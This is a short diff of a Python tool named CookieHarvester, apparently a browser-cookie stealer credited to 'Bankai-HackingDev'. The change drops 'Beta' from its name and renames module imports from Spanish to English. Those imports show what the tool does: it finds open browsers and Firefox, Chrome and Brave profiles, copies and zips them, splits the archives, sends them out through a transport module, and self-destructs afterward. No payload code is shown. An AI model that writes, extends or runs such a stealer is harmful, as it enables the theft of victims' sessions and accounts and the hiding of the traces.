@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-CookieHarvester Beta
+CookieHarvester
 - Desarrollado por Bankai-HackingDev.
 - Usado y testeado en Linux Mint 22.3 y Fedora 44 KDE.
 - Eficaz contra navegadores por defecto como Firefox.
@@ -45,16 +45,16 @@ else:
     requests = None
 
 # Lógica de negocio.
-from core.navegadores import detectar_navegadores_abiertos
-from core.perfiles import (
+from core.browsers import detectar_navegadores_abiertos
+from core.profiles import (
     encontrar_perfil_firefox,
     encontrar_perfil_chrome,
     encontrar_perfil_brave,
 )
-from core.copia import copiar_carpeta
+from core.copy import copiar_carpeta
 from core.info import crear_info_txt
-from core.compresion import crear_zip_desde_carpeta, dividir_zip_en_partes
-from core.limpieza import autodestruir_seguro
+from core.compression import crear_zip_desde_carpeta, dividir_zip_en_partes
+from core.cleaning import autodestruir_seguro
 
 # Transporte.
 from transport import get_transport
